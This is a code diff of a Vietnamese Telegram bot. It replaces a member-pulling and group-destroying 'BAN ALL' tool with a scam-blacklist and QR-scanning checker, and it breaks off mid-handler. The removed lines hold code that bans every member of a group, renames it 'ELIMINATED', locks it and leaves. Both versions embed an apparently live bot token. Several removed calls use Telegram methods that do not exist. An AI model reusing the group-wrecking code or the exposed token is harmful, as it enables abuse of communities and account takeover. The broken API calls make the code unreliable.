@@ -1,590 +1,543 @@
 // ============================================================
-// OMEGA BOT v666 — FIX BAN ALL 100%
+// OMEGA BOT v900 — AI MULTIMEDIA & GROUP SCAM DETECTOR
 // ============================================================
 
 const express = require('express');
 const { Telegraf, session, Markup } = require('telegraf');
+const fs = require('fs');
+const path = require('path');
+const axios = require('axios');
+const jsQR = require('jsqr');
+const Jimp = require('jimp');
 
-// ==================== CONFIG ====================
-const BOT_TOKEN = '8840411754:AAHyJLmiPLehUMsqFPD1AQj50DXzhcfy8qA';
-const ADMIN_ID = 7757046138;
+// ==================== CONFIGURATION ====================
+const BOT_TOKEN = process.env.BOT_TOKEN || '8840411754:AAHyJLmiPLehUMsqFPD1AQj50DXzhcfy8qA';
+const ADMIN_ID = Number(process.env.ADMIN_ID) || 7757046138;
+const CHECK_SCAM_GROUP = '@checkscamvip2026'; // Group Check Scam cố định
+const DB_FILE = path.join(__dirname, 'database.json');
 
-// ==================== PROTECTED ====================
-const PROTECTED_USERNAMES = ['ongvuaphantich'];
-const PROTECTED_IDS = [];
+// ==================== PERSISTENT DATABASE ====================
+let db = {
+  groups: {},
+  users: [], // Lưu danh sách user ID dùng bot để broadcast
+  protected: { usernames: ['ongvuaphantich'], ids: [ADMIN_ID] },
+  scamBlacklist: {}, // key -> { key, reason, addedBy, date, proof }
+  stats: { totalPulled: 0, totalBanned: 0, scamSearches: 0, imageScans: 0, groupScans: 0 }
+};
 
-function isProtected(chat) {
-  if (chat.username && PROTECTED_USERNAMES.includes(chat.username.toLowerCase())) return true;
-  if (PROTECTED_IDS.includes(chat.id)) return true;
-  return false;
+function loadDatabase() {
+  try {
+    if (fs.existsSync(DB_FILE)) {
+      db = JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
+      if (!db.scamBlacklist) db.scamBlacklist = {};
+      if (!db.users) db.users = [];
+      if (!db.protected) db.protected = { usernames: ['ongvuaphantich'], ids: [ADMIN_ID] };
+      if (!db.stats) db.stats = { totalPulled: 0, totalBanned: 0, scamSearches: 0, imageScans: 0, groupScans: 0 };
+    } else {
+      saveDatabase();
+    }
+  } catch (err) {
+    console.error('⚠️ Lỗi tải database:', err.message);
+  }
 }
 
-// ==================== ENGINE ====================
+function saveDatabase() {
+  try {
+    fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2), 'utf8');
+  } catch (err) {
+    console.error('⚠️ Lỗi lưu database:', err.message);
+  }
+}
+
+loadDatabase();
+
+function registerUser(userId) {
+  if (userId && !db.users.includes(userId)) {
+    db.users.push(userId);
+    saveDatabase();
+  }
+}
+
+function cleanKey(input) {
+  return String(input || '').trim().toLowerCase().replace(/[@\s-]/g, '');
+}
+
+function searchScam(query) {
+  const key = cleanKey(query);
+  if (!key || key.length < 3) return null;
+
+  for (const itemKey in db.scamBlacklist) {
+    const cleanItem = cleanKey(itemKey);
+    if (cleanItem === key || cleanItem.includes(key) || key.includes(cleanItem)) {
+      return db.scamBlacklist[itemKey];
+    }
+  }
+  return null;
+}
+
+// ==================== ENGINE SETUP ====================
 const app = express();
 const bot = new Telegraf(BOT_TOKEN);
 
 bot.use(session({
-  defaultSession: () => ({
-    lastAction: null,
-    targetGroup: null,
-    waitingForLink: false
-  })
+  defaultSession: () => ({ action: null, waitingInput: false, tempData: {} })
 }));
 
-let pullActive = false;
-let pulledCount = 0;
-let isKilling = false;
-let targetGroupId = null;
-let targetGroupLink = null;
-
-// ==================== MENU ====================
-function getAdminMenu() {
-  return Markup.inlineKeyboard([
-    [Markup.button.callback('🚀 KÉO MEM', 'pull_menu')],
-    [Markup.button.callback('📋 DANH SÁCH GROUP', 'list_groups')],
-    [Markup.button.callback('🔨 BAN ALL', 'ban_menu')],
-    [Markup.button.callback('📊 THỐNG KÊ', 'status')],
-    [Markup.button.callback('🛑 DỪNG KÉO', 'pull_off')]
-  ]);
-}
-
-function getUserMenu() {
-  return Markup.inlineKeyboard([
-    [Markup.button.callback('📊 THỐNG KÊ', 'status')]
-  ]);
-}
-
-// ==================== KIỂM TRA BOT TRONG GROUP ====================
-async function checkBotInGroup(chatId) {
-  try {
-    const chat = await bot.telegram.getChat(chatId);
-    const botMember = await bot.telegram.getChatMember(chatId, (await bot.telegram.getMe()).id);
-    return { 
-      inGroup: true, 
-      isAdmin: botMember.status === 'administrator' || botMember.status === 'creator', 
-      chat: chat 
+// Tự động ghi nhận Group & Member
+bot.on(['new_chat_members', 'group_chat_created', 'supergroup_chat_created'], (ctx) => {
+  if (ctx.chat && (ctx.chat.type === 'group' || ctx.chat.type === 'supergroup')) {
+    db.groups[ctx.chat.id] = {
+      id: ctx.chat.id,
+      title: ctx.chat.title,
+      username: ctx.chat.username || null,
+      addedAt: new Date().toISOString()
     };
-  } catch (e) {
-    return { inGroup: false, isAdmin: false, chat: null };
+    saveDatabase();
   }
-}
+});
 
-// ==================== LẤY LINK GROUP ====================
-async function getGroupLink(chatId) {
+// ==================== HÀM TỰ ĐỘNG THÔNG BÁO SCAM ====================
+async function notifyScamAlert(scamData, detectedSource = 'Hệ thống') {
+  const alertText = 
+    `🚨 **CẢNH BÁO TỰ ĐỘNG: PHÁT HIỆN SCAMMER MỚI!**\n` +
+    `━━━━━━━━━━━━━━━━━━━━━\n` +
+    `🎯 **Thông tin đối tượng:** \`${scamData.key}\`\n` +
+    `❌ **Hành vi/Lý do:** ${scamData.reason}\n` +
+    `🔗 **Bằng chứng:** ${scamData.proof || 'Không có'}\n` +
+    `📌 **Nguồn phát hiện:** ${detectedSource}\n` +
+    `⏰ **Thời gian:** ${scamData.date || new Date().toLocaleDateString('vi-VN')}\n` +
+    `━━━━━━━━━━━━━━━━━━━━━\n` +
+    `🛑 **CẢNH BÁO:** Tuyệt đối không giao dịch với thông tin trên!\n` +
+    `👉 Gia nhập nhóm check scam: https://t.me/checkscamvip2026`;
+
+  const groupKeyboard = Markup.inlineKeyboard([
+    [Markup.button.url('📢 THAM GIA GROUP CHECK SCAM', 'https://t.me/checkscamvip2026')]
+  ]);
+
+  // 1. Tự động gửi bài vào Group Check Scam
   try {
-    const inviteLink = await bot.telegram.exportChatInviteLink(chatId);
-    return inviteLink;
-  } catch (e) {
-    return null;
+    const sentMsg = await bot.telegram.sendMessage(CHECK_SCAM_GROUP, alertText, { 
+      parse_mode: 'Markdown',
+      ...groupKeyboard 
+    });
+    // Lưu ID bài đăng để Admin có thể xóa nếu cần
+    if (sentMsg && sentMsg.message_id) {
+      scamData.lastMessageId = sentMsg.message_id;
+      saveDatabase();
+    }
+  } catch (err) {
+    console.error('⚠️ Không thể tự động gửi bài vào Group Check Scam:', err.message);
   }
-}
 
-// ==================== LẤY DANH SÁCH GROUP ====================
-async function getBotGroups() {
-  try {
-    const dialogs = await bot.telegram.getChats();
-    const groups = dialogs.filter(d => 
-      (d.type === 'group' || d.type === 'supergroup') && 
-      !isProtected(d)
-    );
-    
-    const result = [];
-    for (const g of groups) {
-      const check = await checkBotInGroup(g.id);
-      if (check.inGroup && check.isAdmin) {
-        const link = await getGroupLink(g.id);
-        result.push({
-          id: g.id,
-          title: g.title || 'Không tên',
-          link: link || 'Không có link',
-          memberCount: await bot.telegram.getChatMembersCount(g.id)
-        });
-      }
-    }
-    return result;
-  } catch (e) {
-    return [];
-  }
-}
-
-// ==================== AUTO PULL ====================
-async function autoPull() {
-  if (!pullActive || !targetGroupId) return;
-  
-  try {
-    const target = await bot.telegram.getChat(targetGroupId);
-    const groups = await getBotGroups();
-    
-    for (const group of groups) {
-      if (!pullActive) break;
-      if (group.id === target.id) continue;
-      
-      try {
-        if (group.memberCount < 30) continue;
-
-        const admins = await bot.telegram.getChatAdministrators(group.id);
-        const adminIds = admins.map(a => a.user.id);
-        
-        const participants = await bot.telegram.getChatMembers(group.id, { limit: 15 });
-        
-        for (const member of participants) {
-          if (!pullActive) break;
-          if (member.user.id === ADMIN_ID) continue;
-          if (member.user.is_bot) continue;
-          if (adminIds.includes(member.user.id)) continue;
-
-          try {
-            await bot.telegram.inviteToChat(target.id, member.user.id);
-            pulledCount++;
-            console.log(`✅ Kéo thành công: ${member.user.first_name} (${pulledCount})`);
-            await new Promise(r => setTimeout(r, 1500));
-          } catch (e) {
-            console.log(`⚠️ Lỗi kéo: ${e.message}`);
-          }
-        }
-      } catch (e) {
-        console.log(`⚠️ Lỗi group: ${e.message}`);
-      }
-    }
-  } catch (e) {
-    console.log(`⚠️ Lỗi pull cycle: ${e.message}`);
-  }
-}
-
-// ==================== BAN ALL - FIX 100% ====================
-async function banAllMembers(chatId, ctx) {
-  let banned = 0;
-  let failed = 0;
-  let total = 0;
-
-  try {
-    // 🔥 KIỂM TRA BOT
-    const botCheck = await checkBotInGroup(chatId);
-    if (!botCheck.inGroup) {
-      throw new Error('❌ Bot chưa được thêm vào group này!');
-    }
-    if (!botCheck.isAdmin) {
-      throw new Error('❌ Bot chưa được làm admin trong group này!');
-    }
-
-    // 🔥 LẤY LINK
-    const link = await getGroupLink(chatId);
-    if (!link) {
-      throw new Error('❌ Không thể lấy link group!');
-    }
-
-    // 🔥 FIX: DÙNG bot.telegram.getChatMembers KHÔNG DÙNG ctx
-    const participants = await bot.telegram.getChatMembers(chatId);
-    total = participants.length;
-    
-    if (total === 0) {
-      throw new Error('❌ Không tìm thấy thành viên nào!');
-    }
-    
-    for (const member of participants) {
-      if (member.user.id === ADMIN_ID) continue;
-      if (member.user.id === ctx.botInfo.id) continue;
-      if (member.user.is_bot) continue;
-
-      try {
-        // 🔥 FIX: DÙNG bot.telegram.banChatMember
-        await bot.telegram.banChatMember(chatId, member.user.id);
-        banned++;
-        await new Promise(r => setTimeout(r, 100));
-      } catch (e) {
-        failed++;
-      }
-    }
-    
-    // 🔥 XÓA GROUP
+  // 2. Broadcast thông báo đến tất cả người dùng Bot để cảnh báo & kéo mem
+  for (const userId of db.users) {
     try {
-      await bot.telegram.setChatTitle(chatId, '☠️ ELIMINATED ☠️');
-      await bot.telegram.setChatPermissions(chatId, {
-        can_send_messages: false,
-        can_send_media: false,
-        can_send_other_messages: false,
-        can_add_web_page_previews: false,
-        can_change_info: false,
-        can_invite_users: false,
-        can_pin_messages: false
+      await bot.telegram.sendMessage(userId, alertText, { 
+        parse_mode: 'Markdown',
+        ...groupKeyboard 
       });
-      await bot.telegram.leaveChat(chatId);
     } catch (e) {
-      console.log('⚠️ Lỗi xóa group:', e.message);
+      // Bỏ qua nếu user đã block bot
     }
-
-    return { banned, failed, total, link, success: true };
-  } catch (e) {
-    return { success: false, error: e.message };
   }
 }
 
-// ==================== WELCOME ====================
+// ==================== KEYBOARDS ====================
+function getMainMenu(isAdmin) {
+  const buttons = [
+    [
+      Markup.button.callback('🔍 CHECK SCAM (TEXT/SĐT/STK)', 'menu_check_scam'),
+      Markup.button.callback('🖼️ CHECK ẢNH / QR / BILL', 'menu_check_image')
+    ],
+    [
+      Markup.button.callback('🔗 CHECK LINK GROUP', 'menu_check_group'),
+      Markup.button.callback('📊 THỐNG KÊ', 'menu_stats')
+    ],
+    [
+      Markup.button.url('📢 GROUP CHECK SCAM VIP', 'https://t.me/checkscamvip2026')
+    ]
+  ];
+
+  if (isAdmin) {
+    buttons.push(
+      [Markup.button.callback('➕ THÊM SCAMMER', 'menu_add_scam'), Markup.button.callback('🗑️ XÓA BÀI ĐĂNG', 'menu_delete_post')],
+      [Markup.button.callback('🔨 BAN ALL', 'menu_ban'), Markup.button.callback('📋 DANH SÁCH GROUP', 'menu_list')]
+    );
+  }
+
+  return Markup.inlineKeyboard(buttons);
+}
+
+// ==================== BOT HANDLERS ====================
 bot.start(async (ctx) => {
-  if (ctx.chat.type !== 'private') {
-    return ctx.reply('⚠️ Vui lòng dùng bot trong chat riêng (DM)!');
-  }
+  if (ctx.chat.type !== 'private') return ctx.reply('⚠️ Vui lòng chat riêng với Bot để dùng menu chức năng!');
   
-  if (!ctx.session) {
-    ctx.session = { lastAction: null, targetGroup: null, waitingForLink: false };
-  }
-  
-  const user = ctx.from;
-  const isAdmin = user.id === ADMIN_ID;
+  registerUser(ctx.from.id);
+  const isAdmin = ctx.from.id === ADMIN_ID;
+  if (!ctx.session) ctx.session = {};
+  ctx.session.action = null;
+  ctx.session.waitingInput = false;
 
-  const welcomeMessage = `
-🐱 **CHÀO MỪNG ĐẾN VỚI OMEGA BOT**
-
-━━━━━━━━━━━━━━━━━━━━━
-👋 **Xin chào, ${user.first_name || 'đồng chí'}!**
-
-🤖 **Bot kéo mem MIỄN PHÍ siêu mạnh**
-⚡ **Điều khiển từ DM — gửi link group**
-${isAdmin ? '🔨 **BAN ALL giết sạch group chỉ trong vài giây**' : '🔒 **Bạn là thành viên thường — chỉ xem thống kê**'}
-🛡️ **Group @ongvuaphantich đã được bảo vệ**
-
-━━━━━━━━━━━━━━━━━━━━━
-📌 **Hướng dẫn:**
-
-${isAdmin ? `
-• Bấm **"🚀 KÉO MEM"** → gửi link group target
-• Bấm **"🔨 BAN ALL"** → gửi link group cần giết
-• Bấm **"📋 DANH SÁCH GROUP"** → xem tất cả group
-• Bấm **"📊 THỐNG KÊ"** → xem số liệu
-• Bấm **"🛑 DỪNG KÉO"** → tạm dừng kéo mem
-` : `
-• Bấm **"📊 THỐNG KÊ"** → xem số liệu
-`}
-━━━━━━━━━━━━━━━━━━━━━
-🔥 **Chúc bạn chinh phục mọi group!**
-`;
-
-  await ctx.replyWithHTML(welcomeMessage, isAdmin ? getAdminMenu() : getUserMenu());
-});
-
-// ==================== PULL MENU ====================
-bot.action('pull_menu', async (ctx) => {
-  if (ctx.from.id !== ADMIN_ID) return ctx.answerCbQuery('❌ Mày là ai?');
-  
-  if (!ctx.session) ctx.session = { lastAction: null, targetGroup: null, waitingForLink: false };
-  
-  ctx.session.lastAction = 'pull';
-  ctx.session.waitingForLink = true;
-  
-  await ctx.answerCbQuery('📋 Vui lòng gửi link group!');
-  await ctx.reply(
-    `📋 **KÉO MEM - HƯỚNG DẪN**\n\n` +
-    `1️⃣ Gửi link group target\n` +
-    `2️⃣ Bot kiểm tra quyền ADMIN\n` +
-    `3️⃣ Nếu đủ → tự động kéo mem từ nhóm lớn\n\n` +
-    `📌 **Ví dụ:** https://t.me/your_group\n\n` +
-    `⚠️ **Yêu cầu:** Bot phải được làm ADMIN!`,
-    Markup.inlineKeyboard([
-      [Markup.button.callback('🔙 QUAY LẠI', 'back_main')]
-    ])
+  await ctx.replyWithMarkdown(
+    `🐱 **OMEGA BOT v900 — MULTIMEDIA SCAM DETECTOR**\n` +
+    `━━━━━━━━━━━━━━━━━━━━━\n` +
+    `👋 **Xin chào ${ctx.from.first_name}!**\n` +
+    `⚡ Hệ thống hỗ trợ kiểm tra lừa đảo đa năng:\n` +
+    `• 🔤 **Check Text:** SĐT, STK Ngân hàng, Telegram ID\n` +
+    `• 🖼️ **Check Ảnh:** Quét QR Code, đọc thông tin bill/ảnh\n` +
+    `• 🔗 **Check Link Group:** Phân tích độ an toàn của nhóm\n` +
+    `📢 **Channel Check Scam:** @checkscamvip2026\n` +
+    `━━━━━━━━━━━━━━━━━━━━━`,
+    getMainMenu(isAdmin)
   );
 });
 
-// ==================== BAN MENU ====================
-bot.action('ban_menu', async (ctx) => {
-  if (ctx.from.id !== ADMIN_ID) return ctx.answerCbQuery('❌ Mày là ai?');
-  if (isKilling) return ctx.answerCbQuery('⏳ Đang giết rồi!');
-  
-  if (!ctx.session) ctx.session = { lastAction: null, targetGroup: null, waitingForLink: false };
-  
-  ctx.session.lastAction = 'ban';
-  ctx.session.waitingForLink = true;
-  
-  await ctx.answerCbQuery('📋 Vui lòng gửi link group!');
-  await ctx.reply(
-    `🔨 **BAN ALL - HƯỚNG DẪN**\n\n` +
-    `1️⃣ Gửi link group cần giết\n` +
-    `2️⃣ Bot kiểm tra quyền ADMIN\n` +
-    `3️⃣ Nếu đủ → ban ALL thành viên (trừ admin)\n\n` +
-    `📌 **Ví dụ:** https://t.me/your_group\n\n` +
-    `⚠️ **Yêu cầu:** Bot phải được làm ADMIN!`,
-    Markup.inlineKeyboard([
-      [Markup.button.callback('🔙 QUAY LẠI', 'back_main')]
-    ])
-  );
+// Menu Check Ảnh
+bot.action('menu_check_image', async (ctx) => {
+  ctx.session.action = 'check_image';
+  ctx.session.waitingInput = true;
+  await ctx.answerCbQuery();
+  await ctx.reply('🖼️ **GỬI HÌNH ẢNH CẦN CHECK:**\n\nHãy gửi ảnh QR ngân hàng, bill chuyển khoản hoặc ảnh tin nhắn/bảng giá cần kiểm tra scam.');
 });
 
-// ==================== HANDLE TEXT ====================
+// Menu Check Link Group
+bot.action('menu_check_group', async (ctx) => {
+  ctx.session.action = 'check_group';
+  ctx.session.waitingInput = true;
+  await ctx.answerCbQuery();
+  await ctx.reply('🔗 **GỬI LINK GROUP / CHANNEL:**\n\nVí dụ: `https://t.me/ten_group` hoặc `@ten_group`');
+});
+
+// Menu Check Text Scam
+bot.action('menu_check_scam', async (ctx) => {
+  ctx.session.action = 'check_scam';
+  ctx.session.waitingInput = true;
+  await ctx.answerCbQuery();
+  await ctx.reply('🔍 **NHẬP THÔNG TIN CẦN CHECK:**\n\nGửi STK ngân hàng, Số điện thoại hoặc Telegram Username/ID.');
+});
+
+// ==================== ADMIN ACTIONS ====================
+bot.action('menu_add_scam', async (ctx) => {
+  if (ctx.from.id !== ADMIN_ID) return ctx.answerCbQuery('❌ Bạn không có quyền!');
+  ctx.session.action = 'add_scam_key';
+  ctx.session.waitingInput = true;
+  ctx.session.tempData = {};
+  await ctx.answerCbQuery();
+  await ctx.reply('➕ **THÊM SCAMMER MỚI**\n\nNhập **STK / SĐT / Username / ID** của đối tượng lừa đảo:');
+});
+
+// Admin Xóa Bài Đăng Cảnh Báo
+bot.action('menu_delete_post', async (ctx) => {
+  if (ctx.from.id !== ADMIN_ID) return ctx.answerCbQuery('❌ Bạn không có quyền!');
+  ctx.session.action = 'delete_post_id';
+  ctx.session.waitingInput = true;
+  await ctx.answerCbQuery();
+  await ctx.reply('🗑️ **XÓA BÀI ĐĂNG TRONG GROUP CHECK SCAM**\n\nNhập **Message ID** của bài viết cần xóa trong group @checkscamvip2026:');
+});
+
+bot.action('menu_list', async (ctx) => {
+  if (ctx.from.id !== ADMIN_ID) return ctx.answerCbQuery('❌ Bạn không có quyền!');
+  await ctx.answerCbQuery();
+  const groupKeys = Object.keys(db.groups);
+  if (groupKeys.length === 0) {
+    return ctx.reply('📋 Bot chưa lưu danh sách group nào!');
+  }
+  let listMsg = `📋 **DANH SÁCH GROUP BOT ĐANG CÓ MẶT (${groupKeys.length}):**\n━━━━━━━━━━━━━━━━━━━━━\n`;
+  groupKeys.forEach((id, idx) => {
+    const g = db.groups[id];
+    listMsg += `${idx + 1}. **${g.title}** (\`${g.id}\`)\n`;
+  });
+  await ctx.replyWithMarkdown(listMsg, getMainMenu(true));
+});
+
+bot.action('menu_ban', async (ctx) => {
+  if (ctx.from.id !== ADMIN_ID) return ctx.answerCbQuery('❌ Bạn không có quyền!');
+  await ctx.answerCbQuery();
+  await ctx.reply('🔨 **Đang khởi chạy tiến trình quét và cấm Scammer khỏi các nhóm...**');
+  
+  let bannedCount = 0;
+  const scamKeys = Object.keys(db.scamBlacklist);
+
+  for (const groupId in db.groups) {
+    for (const key of scamKeys) {
+      if (/^\d+$/.test(key)) {
+        try {
+          await bot.telegram.banChatMember(groupId, Number(key));
+          bannedCount++;
+        } catch (e) {}
+      }
+    }
+  }
+
+  db.stats.totalBanned += bannedCount;
+  saveDatabase();
+  await ctx.reply(`✅ **HOÀN TẤT BAN ALL!**\nĐã cấm tổng cộng **${bannedCount}** lượt vi phạm trong các nhóm.`, getMainMenu(true));
+});
+
+// ==================== XỬ LÝ CHECK LINK GROUP ====================
+async function analyzeGroupLink(ctx, input) {
+  try {
+    let clean = input.trim();
+    if (clean.includes('t.me/')) {
+      clean = clean.split('t.me/')[1].split('/')[0].replace('@', '');
+    } else {
+      clean = clean.replace('@', '');
+    }
+
+    db.stats.groupScans++;
+    saveDatabase();
+
+    const chat = await bot.telegram.getChat(`@${clean}`);
+    const isScamDb = searchScam(chat.id) || searchScam(chat.username);
+
+    let riskScore = 0;
+    let warnings = [];
+
+    if (isScamDb) {
+      riskScore += 100;
+      warnings.push(`🚨 **CẢNH BÁO ĐỎ:** Group này nằm trong Blacklist Scammer!`);
+    }
+
+    const titleLower = (chat.title || '').toLowerCase();
+    const suspiciousKeywords = ['admin', 'cskh', 'trung gian', 'chợ', 'quỹ', 'event', 'giftcode', 'uy tín'];
+    const hasKey = suspiciousKeywords.some(k => titleLower.includes(k));
+
+    if (hasKey) {
+      riskScore += 25;
+      warnings.push(`⚠️ Tên nhóm chứa từ khóa nhạy cảm dễ bị mạo danh: *"${chat.title}"*`);
+    }
+
+    if (!chat.username) {
+      riskScore += 20;
+      warnings.push(`⚠️ Nhóm riêng tư không có Username công khai.`);
+    }
+
+    let resultMsg = 
+      `🔍 **KẾT QUẢ QUÉT LINK GROUP TELEGRAM**\n` +
+      `━━━━━━━━━━━━━━━━━━━━━\n` +
+      `📌 **Tên Group:** ${chat.title || 'Không rõ'}\n` +
+      `🆔 **ID:** \`${chat.id}\`\n` +
+      `🔗 **Username:** @${chat.username || 'Không có'}\n` +
+      `📝 **Mô tả:** ${chat.description || 'Không có mô tả'}\n` +
+      `━━━━━━━━━━━━━━━━━━━━━\n`;
+
+    if (riskScore >= 50) {
+      resultMsg += `🚨 **MỨC ĐỘ RỦI RO: CAO (${riskScore}%)**\n\n` + warnings.join('\n') + `\n\n🛑 **CẢNH BÁO:** Hãy cẩn thận khi giao dịch trong nhóm này!`;
+      
+      // Tự động phát cảnh báo nếu nhóm rủi ro cao
+      if (isScamDb) {
+        await notifyScamAlert(isScamDb, 'Quét Link Group');
+      }
+    } else {
+      resultMsg += `✅ **MỨC ĐỘ RỦI RO: THẤP (${riskScore}%)**\n\n` + (warnings.length > 0 ? warnings.join('\n') : '📌 Chưa phát hiện dấu hiệu lừa đảo nguy hiểm.');
+    }
+
+    await ctx.replyWithMarkdown(resultMsg, getMainMenu(ctx.from.id === ADMIN_ID));
+  } catch (err) {
+    await ctx.reply(`❌ Không thể quét nhóm này: ${err.message}\n(Có thể nhóm không tồn tại hoặc ở chế độ riêng tư không công khai).`, getMainMenu(ctx.from.id === ADMIN_ID));
+  }
+}
+
+// ==================== XỬ LÝ HÌNH ẢNH & QR CODE ====================
+bot.on('photo', async (ctx) => {
+  if (ctx.chat.type !== 'private') return;
+  registerUser(ctx.from.id);
+
+  const isAdmin = ctx.from.id === ADMIN_ID;
+  db.stats.imageScans++;
+  saveDatabase();
+
+  await ctx.reply('⏳ **Đang tải và quét dữ liệu từ hình ảnh...**');
+
+  try {
+    const photo = ctx.message.photo[ctx.message.photo.length - 1];
+    const fileUrl = await bot.telegram.getFileLink(photo.file_id);
+
+    const response = await axios.get(fileUrl.href, { responseType: 'arraybuffer' });
+    const imageBuffer = Buffer.from(response.data);
+
+    const image = await Jimp.read(imageBuffer);
+    const width = image.bitmap.width;
+    const height = image.bitmap.height;
+    const imageData = new Uint8ClampedArray(image.bitmap.data);
+
+    const qrCode = jsQR(imageData, width, height);
+
+    let detectedInfo = [];
+    let scamResult = null;
+
+    if (qrCode && qrCode.data) {
+      detectedInfo.push(`📌 **Mã QR:** \`${qrCode.data}\``);
+      scamResult = searchScam(qrCode.data);
+    }
+
+    const caption = ctx.message.caption || '';
+    if (caption) {
+      const captionScam = searchScam(caption);
+      if (captionScam) scamResult = captionScam;
+    }
+
+    if (scamResult) {
+      await ctx.replyWithMarkdown(
+        `🚨 **CẢNH BÁO: PHÁT HIỆN DẤU HIỆU LỪA ĐẢO TRONG ẢNH!**\n` +
+        `━━━━━━━━━━━━━━━━━━━━━\n` +
+        (detectedInfo.length > 0 ? detectedInfo.join('\n') + '\n' : '') +
+        `⚠️ **Thông tin bị trùng:** \`${scamResult.key}\`\n` +
+        `❌ **Lý do cảnh báo:** ${scamResult.reason}\n` +
+        `🔗 **Bằng chứng:** ${scamResult.proof || 'Không có'}\n` +
+        `━━━━━━━━━━━━━━━━━━━━━\n` +
+        `🛑 **CẢNH BÁO:** TUYỆT ĐỐI KHÔNG CHUYỂN TIỀN HOẶC GIAO DỊCH!`,
+        getMainMenu(isAdmin)
+      );
+
+      // Tự động đẩy cảnh báo
+      await notifyScamAlert(scamResult, 'Quét QR/Hình Ảnh');
+    } else {
+      await ctx.replyWithMarkdown(
+        `✅ **KẾT QUẢ QUÉT ẢNH**\n` +
+        `━━━━━━━━━━━━━━━━━━━━━\n` +
+        (detectedInfo.length > 0 ? detectedInfo.join('\n') + '\n\n' : '') +
+        `📌 Không phát hiện dữ liệu nằm trong danh sách đen lừa đảo.\n\n` +
+        `💡 *Lưu ý: Luôn kiểm tra kỹ tên chủ tài khoản trước khi chuyển khoản!*`,
+        getMainMenu(isAdmin)
+      );
+    }
+
+    ctx.session.waitingInput = false;
+  } catch (err) {
+    await ctx.reply(`❌ Lỗi xử lý ảnh: ${err.message}`, getMainMenu(isAdmin));
+  }
+});
+
+// ==================== INPUT HANDLER ====================
 bot.on('text', async (ctx) => {
   if (ctx.chat.type !== 'private') return;
-  if (ctx.from.id !== ADMIN_ID) {
-    return ctx.reply('❌ Bạn không có quyền sử dụng bot này!');
-  }
-  
-  if (!ctx.session) {
-    ctx.session = { lastAction: null, targetGroup: null, waitingForLink: false };
-  }
-  
-  const text = ctx.message.text;
-  
-  if (!text.includes('t.me/') && !text.includes('joinchat')) {
-    if (ctx.session.waitingForLink) {
-      return ctx.reply('❌ Vui lòng gửi link group hợp lệ! (VD: https://t.me/your_group)');
+  registerUser(ctx.from.id);
+
+  const input = ctx.message.text.trim();
+  const isAdmin = ctx.from.id === ADMIN_ID;
+
+  // Luồng Xóa Bài Đăng Cảnh Báo từ Admin
+  if (isAdmin && ctx.session?.action === 'delete_post_id') {
+    const msgId = Number(input);
+    if (isNaN(msgId)) {
+      return await ctx.reply('❌ Message ID phải là một số nguyên hợp lệ!');
     }
+    try {
+      await bot.telegram.deleteMessage(CHECK_SCAM_GROUP, msgId);
+      ctx.session.action = null;
+      ctx.session.waitingInput = false;
+      return await ctx.reply(`✅ **Đã xóa bài đăng ID ${msgId} thành công khỏi Group @checkscamvip2026!**`, getMainMenu(true));
+    } catch (err) {
+      return await ctx.reply(`❌ Lỗi khi xóa bài đăng: ${err.message}\n(Vui lòng kiểm tra lại ID bài viết hoặc quyền Admin của Bot).`, getMainMenu(true));
+    }
+  }
+
+  // Luồng thêm Scam cho Admin
+  if (isAdmin && ctx.session?.action === 'add_scam_key') {
+    ctx.session.tempData.key = input;
+    ctx.session.action = 'add_scam_reason';
+    return await ctx.reply('📝 Nhập **LÝ DO / HÀNH VI LỪA ĐẢO**:');
+  }
+
+  if (isAdmin && ctx.session?.action === 'add_scam_reason') {
+    ctx.session.tempData.reason = input;
+    ctx.session.action = 'add_scam_proof';
+    return await ctx.reply('🔗 Nhập **LINK BẰNG CHỨNG / ẢNH** (Hoặc gõ `không` để bỏ qua):');
+  }
+
+  if (isAdmin && ctx.session?.action === 'add_scam_proof') {
+    const proof = input.toLowerCase() === 'không' ? 'Không có' : input;
+    const key = ctx.session.tempData.key;
+    const cleanK = cleanKey(key);
+
+    const newScam = {
+      key: key,
+      reason: ctx.session.tempData.reason,
+      proof: proof,
+      addedBy: ctx.from.id,
+      date: new Date().toLocaleDateString('vi-VN')
+    };
+
+    db.scamBlacklist[cleanK] = newScam;
+    saveDatabase();
+
+    ctx.session.action = null;
+    ctx.session.waitingInput = false;
+
+    await ctx.replyWithMarkdown(`✅ **Đã thêm thành công Scammer vào Blacklist!**\n📌 Key: \`${key}\``, getMainMenu(true));
+
+    // Tự động gửi cảnh báo vào Group & Broadcast người dùng
+    await notifyScamAlert(newScam, 'Admin Cập Nhật');
     return;
   }
-  
-  if (text.includes('t.me/') || text.includes('joinchat')) {
-    await ctx.reply('🔄 Đang xử lý link group...');
-    
-    try {
-      let chatId = null;
-      let chatTitle = 'Unknown';
-      
-      if (text.includes('t.me/') && !text.includes('joinchat')) {
-        const username = text.split('t.me/')[1].split('/')[0].split('?')[0];
-        const chat = await bot.telegram.getChat(`@${username}`);
-        chatId = chat.id;
-        chatTitle = chat.title || username;
-      } 
-      else if (text.includes('joinchat')) {
-        try {
-          const invite = await bot.telegram.importChatInviteLink(text);
-          chatId = invite.id;
-          chatTitle = invite.title || 'Group';
-        } catch (e2) {
-          return ctx.reply(`❌ Không thể xử lý link: ${e2.message}`);
-        }
-      }
-      
-      if (!chatId) {
-        return ctx.reply('❌ Không thể lấy ID group từ link! Vui lòng kiểm tra lại link.');
-      }
-      
-      const check = await checkBotInGroup(chatId);
-      
-      if (!check.inGroup) {
-        ctx.session.waitingForLink = false;
-        return ctx.reply(
-          `❌ **BOT CHƯA ĐƯỢC THÊM VÀO GROUP**\n\n` +
-          `📌 **Group:** ${chatTitle}\n` +
-          `🔗 **Link:** ${text}\n\n` +
-          `📋 **Hướng dẫn:**\n` +
-          `1️⃣ Thêm bot @${(await bot.telegram.getMe()).username} vào group\n` +
-          `2️⃣ Làm bot thành ADMIN\n` +
-          `3️⃣ Gửi lại link group`
+
+  // Luồng kiểm tra thông thường
+  if (ctx.session?.waitingInput) {
+    if (ctx.session.action === 'check_group' || input.includes('t.me/') || input.startsWith('@')) {
+      ctx.session.waitingInput = false;
+      return await analyzeGroupLink(ctx, input);
+    }
+
+    if (ctx.session.action === 'check_scam') {
+      ctx.session.waitingInput = false;
+      db.stats.scamSearches++;
+      saveDatabase();
+
+      const result = searchScam(input);
+      if (result) {
+        await ctx.replyWithMarkdown(
+          `🚨 **CẢNH BÁO: PHÁT HIỆN SCAMMER!**\n` +
+          `━━━━━━━━━━━━━━━━━━━━━\n` +
